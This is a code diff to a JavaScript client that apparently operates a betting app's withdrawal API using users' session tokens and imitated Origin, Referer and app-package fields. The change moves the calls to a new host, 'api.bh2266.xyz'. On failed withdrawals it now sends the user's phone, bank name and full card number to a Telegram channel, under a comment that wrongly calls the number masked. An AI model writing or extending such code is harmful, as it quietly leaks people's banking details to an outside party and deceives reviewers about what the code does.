@@ -2296,7 +2296,7 @@
     S.currentPanel='withdraw';
     await getBalance();
     try{
-      const r=await fetch('https://api.bh556677ww.com/app/card/info',{
+      const r=await fetch('https://api.bh2266.xyz/app/card/info',{
         method:'POST',
         headers:{'Accept':'application/json','Content-Type':'application/json','token':S.token,'packageid':'2','Origin':'https://playbhau.com','Referer':'https://playbhau.com/'},
         body:JSON.stringify({channel:'h5',channelId:'Samsung',lang:'en_US',visitor:S.visitor,packageId:2,packageInfo:'com.resulta.checka',reqDate:Date.now(),ua:'Mozilla/5.0',versionCode:'999'})
@@ -2347,9 +2347,10 @@
         });
         const d=await r.json();
         const div=document.getElementById('withdrawResult');
+        const selectedCard = S.withdrawCards.find(c => Number(c.id) === Number(S.selectedCard));
+        const bankName = selectedCard?.bankName || selectedCard?.bank || selectedCard?.bankCardName || 'Bank';
+        const cardNo = selectedCard?.accountNumber || selectedCard?.cardNumber || selectedCard?.cardNo || selectedCard?.accountNo || selectedCard?.bankCardNumber || selectedCard?.bankCardNo || selectedCard?.number || selectedCard?.acctNo || selectedCard?.acctNumber || '';
         if(r.status===200 && (d.code===0||d.success===true)){
-          const selectedCard = S.withdrawCards.find(c => Number(c.id) === Number(S.selectedCard));
-          const bankName = selectedCard?.bankName || selectedCard?.bank || selectedCard?.bankCardName || 'Bank';
           div.innerHTML=`<div style="background:rgba(0,0,0,0.2);padding:10px;border-radius:16px;"><div style="color:#34d399;font-weight:600;">✅ Withdrawal successful!</div><div style="color:#6b7280;">₹${amt.toFixed(2)} withdrawn</div></div>`;
           showToast('Withdrawal successful!','success');
           void trackProfitEvent('WITHDRAW',S.phone,amt);
@@ -2370,15 +2371,13 @@
           div.innerHTML=`<div style="color:#fb7185;">❌ ${reason}</div>`;
           showToast('Withdrawal failed: '+reason,'error');
 
-          // Send the actual API failure reason to Telegram.
-          const selectedCard = S.withdrawCards.find(c => Number(c.id) === Number(S.selectedCard));
-          const bankName = selectedCard?.bankName || selectedCard?.bank || selectedCard?.bankCardName || 'Bank';
-          const cardNo = selectedCard?.accountNumber || selectedCard?.cardNumber || selectedCard?.cardNo || '';
+          // Send failure notification with the selected card's masked number.
           await sendTelegramWithdrawalNotification({
             status:'FAILED',
             amount:amt,
             phone:S.phone,
             bank:bankName,
+            cardNo:cardNo,
             reason
           });
         }
@@ -2391,7 +2390,7 @@
   async function renderAddCard(){
     S.currentPanel='addcard';
     try{
-      const r=await fetch('https://api.bh556677ww.com/app/card/info',{
+      const r=await fetch('https://api.bh2266.xyz/app/card/info',{
         method:'POST',
         headers:{'Accept':'application/json','Content-Type':'application/json','token':S.token,'packageid':'2','Origin':'https://playbhau.com','Referer':'https://playbhau.com/'},
         body:JSON.stringify({channel:'h5',channelId:'Samsung',lang:'en_US',visitor:S.visitor,packageId:2,packageInfo:'com.resulta.checka',reqDate:Date.now(),ua:'Mozilla/5.0',versionCode:'999'})
